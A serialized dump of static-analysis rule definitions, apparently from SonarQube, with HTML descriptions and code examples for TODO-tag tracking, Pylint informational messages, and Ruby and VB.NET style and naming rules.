
˚

ruby:S1135Ï
rubyS1135Track uses of "TODO" tags"INFO*ruby:©<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def do_something()
   # TODO
end
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>Z
CODE_SMELL
Ç
vbnet:S1135Ú
vbnetS1135Track uses of "TODO" tags"INFO*vbnet:≠<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Sub DoSomething()
    ' TODO
End Sub
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>Z
CODE_SMELL
≠
scala:S1135ù
scalaS1135Track uses of "TODO" tags"INFO*scala:ÿ<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>Z
CODE_SMELL
¸
	php:S1135Ó
phpS1135Track uses of "TODO" tags"INFO*php:≠<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function doSomething() {
  // TODO
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>Z
CODE_SMELL
∂
Pylint:I0010•
PylintI0010 Unable to consider inline option"INFO*py2I0010:UUsed when an inline option is either badly formatted or can't be used inside modules.Z
CODE_SMELL
ü
Pylint:I0011é
PylintI0011Locally disabling message"INFO*py2I0011:EUsed when an inline option disables a message or a messages category.Z
CODE_SMELL
ù
Pylint:I0012å
PylintI0012Locally enabling message"INFO*py2I0012:DUsed when an inline option enables a message or a messages category.Z
CODE_SMELL
Ñ
Pylint:I0013t
PylintI0013Ignoring entire file"INFO*py2I0013:0Used to inform that the file will not be checkedZ
CODE_SMELL
∞
Pylint:I1101ü
PylintI1101"Non-existent member of C extension"INFO*py2I1101:ÃUsed when a variable is accessed for non-existent member of C extension. Due to unavailability of source static analysis is impossible, but it may be performed by introspecting living objects in run-time.Z
CODE_SMELL
¿
Pylint:I0001Ø
PylintI0001-Unable to run raw checkers on built-in module"INFO*py2I0001:RUsed to inform that a built-in module has not been checked using the raw checkers.Z
CODE_SMELL
é
Pylint:I0020˝
PylintI0020Suppressed message"INFO*py2I0020:∫A message was triggered on a line, but suppressed explicitly by a disable= comment in the file. This message is not generated for messages that are ignored due to configuration settings.Z
CODE_SMELL
¡
Pylint:I0021∞
PylintI0021Useless suppression of message"INFO*py2I0021:bReported when a message is explicitly disabled for a line or a block of code, but never triggered.Z
CODE_SMELL
Í
Pylint:I0022Ÿ
PylintI0022Deprecated pragma"INFO*py2I0022:óSome inline pylint options have been renamed or reworked, only the most recent form should be used. NOTE:skip-all is only available with pylint >= 0.26Z
CODE_SMELL
Ö
Pylint:I0023u
PylintI0023Use symbolic message"INFO*py2I0023:1Used when a message is enabled or disabled by id.Z
CODE_SMELL
Ä
kotlin:S1135Ô
kotlinS1135Track uses of "TODO" tags"INFO*kotlin:®<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
fun doSomething() {
  // TODO
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>Z
CODE_SMELL
ß
	Web:S1135ô
WebS1135Track uses of "TODO" tags"INFO*web:ÿ<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>Z
CODE_SMELL
„
Web:ParentElementIllegalCheck¡
WebParentElementIllegalCheck*Track presence of forbidden parent element"INFO*web:Ÿ<p>Checker for illegal parent element. </p>
<p>E.g.: title must not have parent element body.</p>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href='/coding_rules#rule_key=Web%3AS1931'>S1931</a> instead.</p>@Z
CODE_SMELL
â
javascript:S1135Ù

javascriptS1135Track uses of "TODO" tags"INFO*js:≠<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function doSomething() {
  // TODO
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>Z
CODE_SMELL
˚

java:S1135Ï
javaS1135Track uses of "TODO" tags"INFO*java:©<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void doSomething() {
  // TODO
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>Z
CODE_SMELL
ﬂ

java:S1133–
javaS1133!Deprecated code should be removed"INFO*java:Ö<p>This rule is meant to be used as a way to track code which is marked as being deprecated. Deprecated code should eventually be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Foo {
  /**
   * @deprecated
   */
  public void foo() {    // Noncompliant
  }

  @Deprecated            // Noncompliant
  public void bar() {
  }

  public void baz() {    // Compliant
  }
}
</pre>Z
CODE_SMELL
•

java:S3688ñ
javaS3688 Track uses of disallowed classes"INFO*java: <p>This rule allows banning certain classes.</p>
<h2>Noncompliant Code Example</h2>
<p>Given parameters:</p>
<ul>
  <li> className:java.lang.String </li>
</ul>
<pre>
String name;  // Noncompliant
</pre>@Z
CODE_SMELL
Û
	java:S923Â
javaS923CFunctions should not be defined with a variable number of arguments"INFO*java:˘<p>As stated per effective java : </p>
<blockquote>
  <p>Varargs methods are a convenient way to define methods that require a variable number of arguments, but they should not be overused. They can
  produce confusing results if used inappropriately.</p>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
void fun ( String... strings )	// Noncompliant
{
  // ...
}
</pre>Z
CODE_SMELL
Ì

java:S1309ﬁ
javaS1309-Track uses of "@SuppressWarnings" annotations"INFO*java:á<p>This rule allows you to track the usage of the <code>@SuppressWarnings</code> mechanism.</p>
<h2>Noncompliant Code Example</h2>
<p>With a parameter value of "unused" :</p>
<pre>
@SuppressWarnings("unused")
@SuppressWarnings("unchecked")  // Noncompliant
</pre>Z
CODE_SMELL
è
csharpsquid:S1135˘
csharpsquidS1135Track uses of "TODO" tags"INFO*cs:±<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private void DoSomething()
{
  // TODO
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>Z
CODE_SMELL
ë
csharpsquid:S1309˚
csharpsquidS1309*Track uses of in-source issue suppressions"INFO*cs:¢<p>This rule allows you to track the usage of the <code>SuppressMessage</code> attributes and <code>#pragma warning disable</code> mechanism.</p>
<h2>Noncompliant Code Example</h2>
<pre>
[SuppressMessage("", "S100")]
...

#pragma warning disable S100
...
#pragma warning restore S100
</pre>Z
CODE_SMELL
Ì
go:S1135‡
goS1135Track uses of "TODO" tags"INFO*go:°<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
func foo() {
  // TODO
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>Z
CODE_SMELL
∑
	xml:S1135©
xmlS1135Track uses of "TODO" tags"INFO*xml:Ë<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;!-- TODO Drop this dependency --&gt;
&lt;dependency&gt;
  &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
  &lt;artifactId&gt;commons-lang3&lt;/artifactId&gt;
  &lt;version&gt;3.8.1&lt;/version&gt;
&lt;/dependency&gt;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>Z
CODE_SMELL
 

ruby:S4663ª
rubyS4663'Multi-line comments should not be empty"MINOR*ruby:È<p>An empty multi-line comment is likely to be a mistake and doesn't help to improve the readability of the code. For these reasons, it should be
removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
=begin
=end

=begin


=end
</pre>Z
CODE_SMELL
ô
	ruby:S105ã
rubyS105(Tabulation characters should not be used"MINOR*ruby:π<p>Developers should not need to configure the tab width of their text editors in order to be able to read source code.</p>
<p>So the use of the tabulation character must be banned.</p>Z
CODE_SMELL
ß

ruby:S1940ò
rubyS1940%Boolean checks should not be inverted"MINOR*ruby:»<p>It is needlessly complex to invert the result of a boolean comparison. The opposite comparison should be made instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if  !(a == 2)  # Noncompliant
  # ...
end

b = !(a &lt; 10) # Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if a != 2
  # ...
end
b = (a &gt;= 10)
</pre>Z
CODE_SMELL
‚
	ruby:S101‘
rubyS1012Class names should comply with a naming convention"MINOR*ruby:¯<p>Shared coding conventions allow teams to collaborate effectively. This rule allows to check that all class names match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>^[A-Z][a-zA-Z0-9]*$</code>:</p>
<pre>
class my_class
  ...
end
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass
  ...
end
</pre>Z
CODE_SMELL
Å
	ruby:S100Û
rubyS1003Method names should comply with a naming convention"MINOR*ruby:ñ<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all function names match a provided regular expression.</p>Z
CODE_SMELL
•

ruby:S1481ñ
rubyS1481(Unused local variables should be removed"MINOR*ruby:√<p>If a local variable is declared but not used, it is dead code and should be removed. Doing so will improve maintainability because developers will
not wonder what the variable is used for.</p>Z
CODE_SMELL
ª
	ruby:S117≠
rubyS117Ifunction and block parameter names should comply with a naming convention"MINOR*ruby:∫<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when a function or block parameter name does not match
the provided regular expression.</p>Z
CODE_SMELL
ë	
vbnet:S2347Å	
vbnetS23475Event handlers should comply with a naming convention"MINOR*vbnet:ü<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all even handler names match a provided regular
expression.</p>
<p>The default configuration is:</p>
<ul>
  <li> Either in Pascal case, i.e. starting with an upper case letter, e.g. OnMyButtonClicked </li>
  <li> Or, a subject, in Pascal or camel case, followed by an underscore followed by an event name, in Pascal case, e.g. btn1_Clicked </li>
</ul>
<p>Event handlers with a <code>handles</code> clause and two-parameter methods with <code>EventArgs</code> second parameter are covered by this
rule.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^(([a-z][a-z0-9]*)?([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?_)?([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code>:</p>
<pre>
Module Module1
    Sub subject__SomeEvent() Handles X.SomeEvent   ' Noncompliant - two underscores
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub subject_SomeEvent() Handles X.SomeEvent    ' Compliant
    End Sub
End Module
</pre>Z
CODE_SMELL
Í
vbnet:S2344⁄
vbnetS2344AEnumeration type names should not have "Flags" or "Enum" suffixes"MINOR*vbnet:Ï<p>The information that an enumeration type is actually an enumeration or a set of flags should not be duplicated in its name.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Enum FooFlags ' Noncompliant
    Foo = 1
    Bar = 2
    Baz = 4
End Enum
</pre>
<h2>Compliant Solution</h2>
<pre>
Enum Foo      ' Compliant
    Foo = 1
    Bar = 2
    Baz = 4
End Enum
</pre>Z
CODE_SMELL
Ô
vbnet:S2345ﬂ
vbnetS2345AFlags enumerations should explicitly initialize all their members"MINOR*vbnet:¯
<p>Flags enumerations should not rely on the language to initialize the values of their members. Implicit initialization will set the first member to
0, and increment the value by one for each subsequent member. This implicit behavior does not allow members to be combined using the bitwise or
operator in a useful way.</p>
<p>Instead, 0 and powers of two (i.e. 1, 2, 4, 8, 16, ...) should be used to explicitly initialize all the members.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;Flags()&gt;
Enum FruitType    ' Non-Compliant
  None
  Banana
  Orange
  Strawberry
End Enum

Module Module1
  Sub Main()
    Dim bananaAndStrawberry = FruitType.Banana Or FruitType.Strawberry

    ' Will display only Strawberry!
    Console.WriteLine(bananaAndStrawberry.ToString())
  End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;Flags()&gt;
Enum FruitType    ' Compliant
  None = 0
  Banana = 1
  Orange = 2
  Strawberry = 4
End Enum

Module Module1
  Sub Main()
    Dim bananaAndStrawberry = FruitType.Banana Or FruitType.Strawberry

    ' Will display Banana and Strawberry, as expected.
    Console.WriteLine(bananaAndStrawberry.ToString())
  End Sub
End Module
</pre>
<h2>Exceptions</h2>
<p>The default initialization of 0, 1, 2, 3, 4, ... matches 0, 1, 2, 4, 8 ... in the first three values, so no issue is reported if the first three
members of the enumeration is not initialized.</p>ZBUG
À

vbnet:S2342ª

vbnetS23428Enumeration types should comply with a naming convention"MINOR*vbnet:÷	<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all enum names match a provided regular expression.</p>
<p>The default configuration is the one recommended by Microsoft:</p>
<ul>
  <li> Pascal casing, starting with an upper case character, e.g. BackColor </li>
  <li> Short abbreviations of 2 letters can be capitalized, e.g. GetID </li>
  <li> Longer abbreviations need to be lower case, e.g. GetHtml </li>
  <li> If the enum is marked as [Flags] then its name should be plural (e.g. MyOptions), otherwise, names should be singular (e.g. MyOption) </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression for non-flags enums: <code>^([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code></p>
<pre>
Public Enum foo ' Noncompliant
    FooValue = 0
End Enum
</pre>
<p>With the default regular expression for flags enums: <code>^([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?s$</code></p>
<pre>
&lt;Flags()&gt;
Public Enum Option ' Noncompliant
    None = 0,
    Option1 = 1,
    Option2 = 2
End Enum
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Enum Foo
    FooValue = 0
End Enum
</pre>
<pre>
&lt;Flags()&gt;
Public Enum Options
    None = 0,
    Option1 = 1,
    Option2 = 2
End Enum
</pre>Z
CODE_SMELL
ﬂ
vbnet:S2343œ
vbnetS23439Enumeration values should comply with a naming convention"MINOR*vbnet:È<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all enumeration value names match a provided regular
expression.</p>
<p>The default configuration is the one recommended by Microsoft:</p>
<ul>
  <li> Pascal casing, starting with an upper case character, e.g. BackColor </li>
  <li> Short abbreviations of 2 letters can be capitalized, e.g. GetID </li>
  <li> Longer abbreviations need to be lower cased, e.g. GetHtml </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code>:</p>
<pre>
Enum Foo
    fooValue   ' Noncompliant
End Enum
</pre>
<h2>Compliant Solution</h2>
<pre>
Enum Foo
    FooValue   ' Compliant
End Enum
</pre>Z
CODE_SMELL
¡
vbnet:S1659±
vbnetS1659:Multiple variables should not be declared on the same line"MINOR*vbnet: <p>Declaring multiple variable on one line is difficult to read.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
  Public Const AAA As Integer = 5, BBB = 42, CCC As String = "foo"  ' Noncompliant
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
  Public Const AAA As Integer = 5
  Public Const BBB = 42
  Public Const CCC as String = "foo"
End Module
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/7wHEAw">CERT, DCL52-J.</a> - Do not declare more than one variable per declaration
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/VgU">CERT, DCL04-C.</a> - Do not declare more than one variable per declaration </li>
</ul>Z
CODE_SMELL
÷
vbnet:S2348∆
vbnetS2348-Events should comply with a naming convention"MINOR*vbnet:Ï<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all even names match a provided regular expression.</p>
<p>The default configuration is the one recommended by Microsoft:</p>
<ul>
  <li> Pascal casing, starting with an upper case character, e.g. BackColor </li>
  <li> Short abbreviations of 2 letters can be capitalized, e.g. GetID </li>
  <li> Longer abbreviations need to be lower cased, e.g. GetHtml </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code>:</p>
<pre>
Class Foo
    Event fooEvent() ' Noncompliant
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Class Foo
    Event FooEvent() ' Compliant
End Class
</pre>Z
CODE_SMELL
⁄
vbnet:S2349 
vbnetS2349EEvent names should not have "Before" or "After" as a prefix or suffix"MINOR*vbnet:ÿ<p>"After" and "Before" prefixes or suffixes should not be used to indicate pre and post events. The concepts of before and after should be given to
events using the present and past tense.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Class Foo
    Event BeforeClose() ' Noncompliant
    Event AfterClose()  ' Noncompliant
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Class Foo
    Event Closing()     ' Compliant
    Event Closed()      ' Compliant
End Class
</pre>Z
CODE_SMELL
ú

vbnet:S105ç
vbnetS105(Tabulation characters should not be used"MINOR*vbnet:π<p>Developers should not need to configure the tab width of their text editors in order to be able to read source code.</p>
<p>So the use of the tabulation character must be banned.</p>Z
CODE_SMELL
ƒ
vbnet:S1940¥
vbnetS1940%Boolean checks should not be inverted"MINOR*vbnet:‚<p>It is needlessly complex to invert the result of a boolean comparison. The opposite comparison should be made instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
If Not (a = 2) Then  // Noncompliant
Dim b as Boolean = Not (i &lt; 10)  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
If a &lt;&gt; 2 Then
Dim b as Boolean = i &gt;= 10
</pre>Z
CODE_SMELL
Ó
vbnet:S1301ﬁ
vbnetS13019"Select" statements should have at least 3 "Case" clauses"MINOR*vbnet:¯<p><code>switch</code> statements are useful when there are many different cases depending on the value of the same expression.</p>
<p>For just one or two cases however, the code will be more readable with <code>if</code> statements.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Select Case variable
    Case 0
        doSomething()
    Case Else
        doSomethingElse()
End Select
</pre>
<h2>Compliant Solution</h2>
<pre>
If variable = 0 Then
    doSomething()
Else
    doSomethingElse()
End If
</pre>Z
CODE_SMELL
É
vbnet:S2355Û
vbnetS2355CArray literals should be used instead of array creation expressions"MINOR*vbnet:É<p>Array literals are more compact than array creation expressions.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Sub Main()
        Dim foo = New String() {"a", "b", "c"} ' Noncompliant
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub Main()
        Dim foo = {"a", "b", "c"}              ' Compliant
    End Sub
End Module
</pre>Z
CODE_SMELL
ù
vbnet:S2353ç
vbnetS2353)Indexed properties should be named "Item""MINOR*vbnet:∑<p>In most cases, indexed properties should be named Item for consistency. Exceptions are when there exists a name which is obviously better, for
example <code>System.String.Chars(System.Int32)</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Dim array = {"apple", "banana", "orange", "strawberry"}

    ReadOnly Property Foo(ByVal index As Integer)  ' Noncompliant
        Get
            Return array(index)
        End Get
    End Property
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Dim array = {"apple", "banana", "orange", "strawberry"}

    ReadOnly Property Item(ByVal index As Integer)
        Get
            Return array(index)
        End Get
    End Property
End Module
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>Z
CODE_SMELL
Ç
vbnet:S2354Ú
vbnetS2354%Line continuations should not be used"MINOR*vbnet:†<p>To improve the code readability, the explicit line continuation character, <code>_</code>, should not be used. Instead, it is better to break lines
after an operator.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Sub Main()
        ' Noncompliant
        Console.WriteLine("Hello" _
                          &amp; "world")
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub Main()

        Console.WriteLine("Hello" &amp;
                          "world")
    End Sub
End Module
</pre>Z
CODE_SMELL
‘
vbnet:S4136ƒ
vbnetS4136+Method overloads should be grouped together"MINOR*vbnet:Ï<p>For clarity, all overloads of the same method should be grouped together. That lets both users and maintainers quickly understand all the current
available options.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Interface IMyInterface
    Function DoTheThing() As Integer
    Function DoTheOtherThing() As String // Noncompliant
    Function DoTheThing(ByVal Path As String) As Integer
End Interface
</pre>
<h2>Compliant Solution</h2>
<pre>
Interface IMyInterface
    Function DoTheThing() As Integer
    Function DoTheThing(ByVal Path As String) As Integer
    Function DoTheOtherThing() As String
End Interface
</pre>Z
CODE_SMELL
◊

vbnet:S114»
vbnetS1146Interface names should comply with a naming convention"MINOR*vbnet:Ê<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate.</p>
<p>This rule allows to check that all interface names match a provided regular expression.</p>
<p>The default configuration is the one recommended by Microsoft:</p>
<ul>
  <li> Must start with an upper case 'I' character, e.g. IFoo </li>
  <li> Followed by Pascal casing, starting with an upper case character, e.g. IEnumerable </li>
  <li> Short abbreviations of 2 letters can be capitalized, e.g. IFooID </li>
  <li> Longer abbreviations need to be lower cased, e.g. IFooHtml </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^I([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code>:</p>
<pre>
Interface Foo  ' Noncompliant
End Interface
</pre>
<h2>Compliant Solution</h2>
<pre>
Interface IFoo ' Compliant
End Interface
</pre>Z
CODE_SMELL
‘

vbnet:S117≈
vbnetS117;Local variable names should comply with a naming convention"MINOR*vbnet:ﬁ<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate.This rule checks that all local variables
follow a naming convention.</p>
<p>The default configuration is:</p>
<ul>
  <li> Camel casing, starting with a lower case character, e.g. backColor </li>
  <li> Short abbreviations of 2 letters can be capitalized only when not at the beginning, e.g. id, productID </li>
  <li> Longer abbreviations need to be lower cased, e.g. html </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z][a-z0-9]*([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code>:</p>
<pre>
Module Module1
    Sub Main()
        Dim Foo = 0 ' Noncompliant
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub Main()
        Dim foo = 0 ' Compliant
    End Sub
End Module
</pre>Z
CODE_SMELL
∞
vbnet:S1075†
vbnetS1075URIs should not be hardcoded"MINOR*vbnet:◊<p>Hard coding a URI makes it difficult to test a program: path literals are not always portable across operating systems, a given absolute path may
not exist on a specific test environment, a specified Internet URL may not be available when executing the tests, production environment filesystems
usually differ from the development environment, ...etc. For all those reasons, a URI should never be hard coded. Instead, it should be replaced by
customizable parameter.</p>
<p>Further even if the elements of a URI are obtained dynamically, portability can still be limited if the path-delimiters are hard-coded.</p>
<p>This rule raises an issue when URI's or path delimiters are hard coded.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/qQCHAQ">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>Z
CODE_SMELL
·
vbnet:S1197—
vbnetS1197>Array designators "()" should be on the type, not the variable"MINOR*vbnet:Ê<p>Array designators should always be located on the type for better code readability. Otherwise, developers must look both at the type and the
variable name to know whether or not a variable is an array.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Sub Main()
        Dim foo() As String ' Noncompliant
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub Main()
        Dim foo As String() ' Compliant
    End Sub
End Module
</pre>Z
CODE_SMELL
´
vbnet:S1643õ
vbnetS1643=Strings should not be concatenated using "+" or "&" in a loop"MINOR*vbnet:±<p><code>StringBuilder</code> is more efficient than string concatenation, especially when the operator is repeated over and over as in loops.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Sub Main()
        Dim foo = ""
        foo &amp;= "Result: "       ' Compliant - outside of loop

        For i = 1 To 9
            foo &amp;= i            ' Noncompliant
        Next
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub Main()
        Dim foo = New System.Text.StringBuilder
        foo.Append("Result: ")  ' Compliant

        For i = 1 To 9
            foo.Append(i)       ' Compliant
        Next
    End Sub
End Module
</pre>Z
CODE_SMELL
á

vbnet:S1125˜	
vbnetS1125(Boolean literals should not be redundant"MINOR*vbnet:¢	<p>Redundant Boolean literals should be removed from expressions to improve readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
If BooleanMethod() = True Then ' Noncompliant
  ' ...
End If
If BooleanMethod() = False Then ' Noncompliant
  ' ...
End If
If BooleanMethod() OrElse False Then ' Noncompliant
  ' ...
End If
DoSomething(Not False) ' Noncompliant
DoSomething(BooleanMethod() = True) ' Noncompliant

Dim booleanVariable = If(BooleanMethod(), True, False) ' Noncompliant
booleanVariable = If(BooleanMethod(), True, exp) ' Noncompliant
booleanVariable = If(BooleanMethod(), False, exp) ' Noncompliant
booleanVariable = If(BooleanMethod(), exp, True) ' Noncompliant
booleanVariable = If(BooleanMethod(), exp, False) ' Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
If BooleanMethod() Then
  ' ...
End If
If Not BooleanMethod() Then
  ' ...
End If
If BooleanMethod() Then
  ' ...
End If
DoSomething(True)
DoSomething(BooleanMethod())

Dim booleanVariable = BooleanMethod()
booleanVariable = BooleanMethod() OrElse exp
booleanVariable = Not BooleanMethod() AndAlso exp
booleanVariable = Not BooleanMethod() OrElse exp
booleanVariable = BooleanMethod() AndAlso exp
</pre>Z
CODE_SMELL
·

vbnet:S101“
vbnetS1012Class names should comply with a naming convention"MINOR*vbnet:Ù<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that all class
names match a provided regular expression.</p>
<p>The default configuration is the one recommended by Microsoft:</p>
<ul>
  <li> Pascal casing, starting with an upper case character, e.g. BackColor </li>
  <li> Short abbreviations of 2 letters can be capitalized, e.g. GetID </li>
  <li> Longer abbreviations need to be lower cased, e.g. GetHtml </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code>:</p>
<pre>
Class foo ' Noncompliant
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Class Foo ' Compliant
End Class
</pre>Z
CODE_SMELL
‘

vbnet:S2737ƒ

vbnetS2737+"catch" clauses should do more than rethrow"MINOR*vbnet:Ï	<p>A <code>Catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>Catch</code> altogether and letting
it bubble up automatically, but with more code and the additional detriment of leaving maintainers scratching their heads. </p>
<p>Such clauses should either be eliminated or populated with the appropriate logic.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Dim s As String = ""
Try
    s = File.ReadAllText(fileName)
Catch e As Exception
    Throw
End Try
</pre>
<h2>Compliant Solution</h2>
<pre>
Dim s As String = ""
Try
    s = File.ReadAllText(fileName)
Catch e As Exception
    logger.LogError(e)
    Throw
End Try
</pre>
<p>or</p>
<pre>
Dim s As String = File.ReadAllText(fileName)
</pre>
<h2>Exceptions</h2>
